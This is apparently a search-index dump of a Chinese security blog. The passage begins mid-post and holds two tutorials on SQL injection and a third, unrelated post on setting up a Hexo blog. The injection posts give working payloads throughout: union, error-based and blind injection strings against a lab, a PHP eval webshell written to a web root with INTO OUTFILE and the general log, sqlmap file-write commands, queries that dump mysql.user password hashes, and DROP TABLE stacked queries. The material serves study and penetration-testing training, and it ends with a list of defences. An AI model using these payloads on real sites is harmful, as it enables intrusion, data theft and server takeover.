会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。 读取函数：load_file() 导出函数：into outfile 或into dumpfile 前提 应该设置--secure-file-priv 否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在secure-file-priv变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。 The MySQL server is running with the --secure-file-priv option so it cannot execute this statement。 应该对web目录需要有写权限，能够使用单引号 应该知道绝对路径 读取数据库路径：@@datadir 文件读取 只能读取绝对路径的网页文件 读取数据库路径：@@datadir 将绝对路径转换为16进制数时，不需要使用引号 语句： 1and 1=2 union select 1,load_file(&#x27;C:\\\\inetpub\\\\wwwroot\\\\mysql-sql\\\\inc\\\\set_sql.php&#x27;),3,4 然后在网页源码中查看 文件导出（写入到文件） 知道路径： 1?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot; 采用PHPmyadmin，选择一个数据库如test，在数据库中新创建一个表aa，在aa中插入一个数据&lt;?php @eval($_POST['123']);?&gt; 1id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+ 路径获取常见方法 报错显示：一般网站出现错误的时候它会泄露出路径； 遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出； 漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径； 平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径； 爆破； 魔术引号及常见保护 php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用GET，POST，cookie所接收的'单引号，&quot;双引号，\\反斜线和NULL字符全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。 编码或宽字节绕过 isset无法绕过，则替换关键字 宽字节绕过0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27，而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句 自定义关键字替换 其他绕过思路见其他文章 权限获取 数据库操作权限获取 提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法： 弱口令爆破 sqlmap注入的--sql-shell模式 进入交互界面后，通过select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码。 网站的数据库配置文件中拿到明文密码信息。文件名一般都有config CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 Webshell获取 into outfile 知道网站物理路径 高权限数据库用户 load_file()开启 即 secure_file_priv 无限制 可以通过这个查：mysql&gt; show global variables like '%secure_file_priv%'; 值 说明 NULL 不允许导入或导出 /tmp 只允许在/tmp操作 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 网站路径有写入权限 操作 select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;; 1232. ``` sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; 日志文件写 shell Web 文件夹宽松权限可以写入 Windows 系统下 高权限运行 MySQL 或者 Apache 日志设置查看： 12345678mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;general_loggeneral_log_file# 自定义set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/info.php&#x27;;# 往日志里面写入 payloadselect &#x27;&lt;?php phpinfo();?&gt;&#x27;; MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell： 注： 这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ： Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些 系统命令执行（提权【参考国光】） 查询HASH解密 1234# MySQL &lt;= 5.6 版本mysql&gt; select host, user, password from mysql.user;# MySQL &gt;= 5.7 版本mysql &gt; select host,user,authentication_string from mysql.user; 也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的： UDF提权 反弹端口提权 MOF提权 启动项提权 CVE-2016-6663/6664组合拳 低版本注入配合读取或暴力 小于5.0版本 字典或读取，爆破 ACCESS access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。 面对它只能暴力猜解，没有其他办法。 Access注入时，如果列名或者表名猜解不到的情况怎么办？ Access偏移注入：解决列名获取不到的情况。 and 1=2 报错找到注入点 order by 获取总字段 猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表 猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在 脱库 union select 1,username,passwd,4 from admin MSSQL and 1=2报错 order by N# 获取总字段 猜表名 and exists(select * from manage) 表名manage存在 猜解列名and exists(select id from manage)列名id存在 脱库and exists (select id from manage where id=1 )证明id=1存在 and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8 and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16 可用Burp的Intruder功能辅助猜解 猜解username第1到8位的字符，ASCII转码 admin_mz 猜解password第1到16位的字符，ASCII转码(Burp 爆破) 转ASCII的py脚本： 72e1bfc3f01b7583 MD5解密为97285101 常用参数 @@version，查询当前数据库版本 db_name()，查询当前数据库名称 user,system_user,current_user,user_name，查询当前用户 IS_SRVROLEMEMBER()，查询数据库权限。 @@SERVERNAME：获取有关服务器主机的信息 SQLite 找注入点 and 1=1 order by N 猜字段 4 猜数据库 offset ==&gt;0~2 有三个数据库： WSTMart_reg notice_sybase sqlite_sequence 猜列 共有3个字段： id,name,password 脱库 MongoDB id=1′ 单引号注入报错 闭合语句，查看所有集合 查看指定集合的数据 [0] 代表第一条数据，可递增 DB2 and 1=2 判断注入点 order by N 获取字段数 爆当前数据库：GAME_CHARACTER 列表：NAME 脱库 PostgreSQL and 1=2 判断注入点 order by N 获取字段 爆数据库 列表 列字段 脱库 Sybase数据库 and 1=2 判断注入点 order by N 获取总字段 爆数据库 列表 列字段 查状态：结果为：zhang 反选爆用户名：结果为：mozhe 猜解密码 Oracle and 1=1 order by 爆数据库 列表 列字段 脱库 加上状态：1 where STATUS=1 其他 小tips outfile 和 dumpfile的区别 outfile: 支持多行数据同时导出 使用union联合查询时，要保证两侧查询的列数相同 会在换行符制表符后面追加反斜杠 会在末尾追加换行 dumpfile: 每次只能导出一行数据 不会在换行符制表符后面追加反斜杠 不会在末尾追加换行 因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件；into outfile函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入基础","slug":"SQL注入基础","date":"2023-05-23T02:29:45.000Z","updated":"2023-05-25T01:14:36.391Z","comments":true,"path":"articles/2023/05/23/SQL注入基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"SQL注入基础 基础语法以及函数 基础 12345678910# 查询select * from news where id=$id# 更新update user set pwd=’$p’ where id=2 and username=‘admin’# 添加insert into users(id,url,text) values(2,‘x’,’$t’)# 删除delete from news where id=$id# order byselect id,name,price from news order by $order 其他 123456# 增加字段ALTER TABLE employees ADD phone varchar(20)# 权限控制(grant revoke)grant insert on grant_rights to unauthorized_user# 删表DROP TABLE users; 连接词、联合查询 **union：**联合查询 1select * from table where id = 1 union order by 3 join：连接查询（right/left join），如下搜索两个表相同的字段 1select * from users a join users b where a.id = b.id 注释以及其他符号 注释： 1234/* */ are inline comments-- , # are line commentsExample: SELECT * FROM users WHERE name = &#x27;admin&#x27; -- AND pass = &#x27;pass&#x27; 对于# url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用 所以在URL中使用#进行注入时应该将它转成url编码：%23 在POST请求中就不需要（需要验证） 对于--(空格) 一般在GET请求中，空格会直接被忽略，所以需要把他转化成--%20 还有另外一种方式，就是使用--+，这时候+号会被解释成空格 为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload 对于需要编码转码的#有用，因为只有一个字符，POST最好用这个，其他用--+ 堆叠查询： 123; allows query chainingExample: SELECT * FROM users; DROP TABLE users; 查询可用： 1234&#x27;,+,|| allows string concatenationChar() strings without quotesExample: SELECT * FROM users WHERE name = &#x27;+char(27) OR 1=1 注入原理以及危害 对于传入的搜索内容过滤不严，导致用户可以通过拼接SQL语句，对数据库进行操作。 以下情形均可能产生漏洞： 接收数据 拼接数据 数据库执行 结果展示 他会导致如下危害： 危害数据库里的数据 直接危害网站的权限 我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的 SQL 查询方式 基本注入 这里以mysql注入为例子 信息搜集 主要搜集： 123456789# 操作系统select @@version_compile_os# 数据库版本：select version()select @@version# 数据库名字：select database()# 数据库用户：select user() 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 小知识点： 问：一个@与两个@@有何区别？ 答：一个@是用户自定义变量，两个@是系统变量 手工注入 判断是否能注入，以及注入类型 先看是否输出信息：可以使用'、&quot; 和--+来测试 输出正确、错误与报错信息：都可以 输出正确、报错但不输出错误信息：布尔/时间盲注/报错注入 输出正确但不输出报错和错误信息：布尔/时间盲注 不输出任何信息：时间盲注 12# 或 且 非 三种逻辑判断符id=-1&#x27; and 1=1 判断有几个注入点：id=1' order by 3--+ 判断输出点有几个是可以回显的：id=1' union select 1,2,3 --+ 信息搜集： 获取数据库: 获取此时的数据库：id=-1' union select 1,2,database() --+ 获取全部数据库：id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 获取表名:id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查询其他数据库表名把database()换成'you_want' 获取列名：id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='you_want --+' 数据获取： 获取单个：id=-1' union select 1,2,[columnname] from [tablename] --+' 获取全部： id=-1' union select 1,2,group_concat([allcolumnname]) from [tablename]--+ -1' union select 1,2,(select concat_ws([column_name]) from [tbname]) --+ 闭合 常用闭合 1234567or 1=1--+ （数字型）&#x27; or 1=1--+ （字符型）&quot; or 1=1--+ （字符型）) or 1=1--+ （MySQL是允许嵌入多个括号的）&#x27;) or 1=1--+&quot;) or 1=1--+&quot;)) or 1=1--+ 非注释闭合 1234|| &#x27;or &#x27;&amp;&amp; &#x27;1&#x27;=&#x27;1;%00 报错and盲注 盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 基于布尔的 SQL 盲注-逻辑判断：regexp，like，ascii，left，ord，mid 基于时间的 SQL 盲注-延时判断：if，sleep 基于报错的 SQL 盲注-报错回显：floor，updatexml，extractvalue 对于报错注入，其payload可以安排在如下位置： 1234567&#x27;or（有效载荷）or&#x27;&#x27;and（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;=&#x27;&#x27;*（有效载荷）*&#x27;&#x27;or（有效载荷）and&#x27;“ - （有效载荷） - “ 参考： 123456789like ‘ro%’ #判断ro或ro…是否成立regexp ‘^xiaodi[1-z]’ #匹配xiaodi及xiaodi…等if(条件,5,0) #条件成立，返回5，反之，返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从B位置开始，截取字符串a的c长度left(database(),1),database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 涉及资源： 12种报错注入+万能语句 Order by排序注入方法小总结 Insert update 语句：insert into user(username,password) values('$username','$password',) floor：username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ' updatexml：username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or ' extractvalue：username=lwx’ or extractvalue(1,concat(0x7e,database())) or ' delete 在get中需要使用+号或者%20把语句连接起来，避免出错 floor：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1 updatexml：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) extractvalue：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1 布尔与延时盲注 布尔盲注 id=1' and left(version(),1)=5 --+ id=1' and length(database())=8--+ 延时盲注 id=1 and if((length(database()=8)),sleep(5),1)--+ id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+ 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement 。 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。 其他 基础概念 实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名 待补充…","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"HEXO博客的搭建","slug":"HEXO博客的搭建","date":"2023-05-22T12:03:26.000Z","updated":"2023-05-25T02:29:02.249Z","comments":true,"path":"articles/2023/05/22/HEXO博客的搭建/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/","excerpt":"","text":"安装HEXO和相关插件 hexo的安装 先安装node.js，地址：https://nodejs.org/en 安装完后安装Hexo： 1npm install hexo-cli -g 配置腾讯云节点： 12npm config set registry http://mirrors.cloud.tencent.com/npm/npm config get registry # 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。 主题Pure以及配置 主题：https://github.com/cofess/hexo-theme-pure 先初始化一个文件夹，例如Blog： 1hexo init Blog 加载主题： 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 更新主题： 12cd themes/puregit pull 配置（需要配置根目录config）：参考1，参考2，参考3，参考4 12language: zh-CN # 中文... 写文章 参考，没啥要讲的，指令：hexo n &quot;title&quot;，即可。 模板 模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头： 12345678title: HEXO博客的搭建toc: truesidebar: nonedate: 2023-05-22 20:03:26tags: [博客搭建]categories: [杂]descriptions: 本文介绍hexo搭建博客的心路历程typora-root-url: ..\\..\\.. 上面的typora-root-url很重要！下面说到。 设置分类 由于post文件夹里面的文章太多不好管理，那么只要我们分类一下即可。参考 配置： 12permalink: &#x27;articles/:year/:month/:day/:name/&#x27;new_post_name: &#x27;:year/:month/:title.md&#x27; Hexo与Typora协同 先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。 解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录typora-root-url，让hexo能链接到即可！ 参考 404转发 https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404页面/ 常用指令 123456hexo cleanhexo ghexo d # 推送 或者一起：hugo g -dhexo s # 本地测试hexo n &#x27;title&#x27; 推送hexo d 安装npm install hexo-deployer-git --save 然后配置： 12345deploy: type: git repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io branch: [branch] message: [message] 参考：https://hexo.io/zh-cn/docs/one-command-deployment.html 一些问题 Spawn failed https://blog.csdn.net/Kevin_Carpricron/article/details/124069885 组件推荐 文章加密 https://blog.51cto.com/u_15719567/5476056 代码块魔改 http://blog.iwwee.com/posts/hexo-optimize.html 关于复制代码的那一块参考下面的： https://kangaroohy.com/tools/hexo-theme-pure-optimize.html 评论系统开启 https://valine.js.org/quickstart.html Markdown标题头 https://www.npmjs.com/package/hexo-heading-index 博客优化 npm install hexo-neat --save https://github.com/cofess/hexo-theme-pure/blob/master/README.cn.md 优秀的搭建站点 https://hwame.top/20200520/hello-hexo-configuration.html https://tianbiao.top/29-pure主题配置/index.html 效果","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"车联网标准","slug":"车联网标准","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"},{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"业务逻辑","slug":"业务逻辑","permalink":"https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"},{"name":"文件包含","slug":"文件包含","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件读取","slug":"文件读取","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"},{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://j3f5.github.io/tags/SSRF/"},{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"劫持","slug":"劫持","permalink":"https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"},{"name":"跨域","slug":"跨域","permalink":"https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"},{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"远程服务系统","slug":"远程服务系统","permalink":"https://j3f5.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/"},{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"},{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}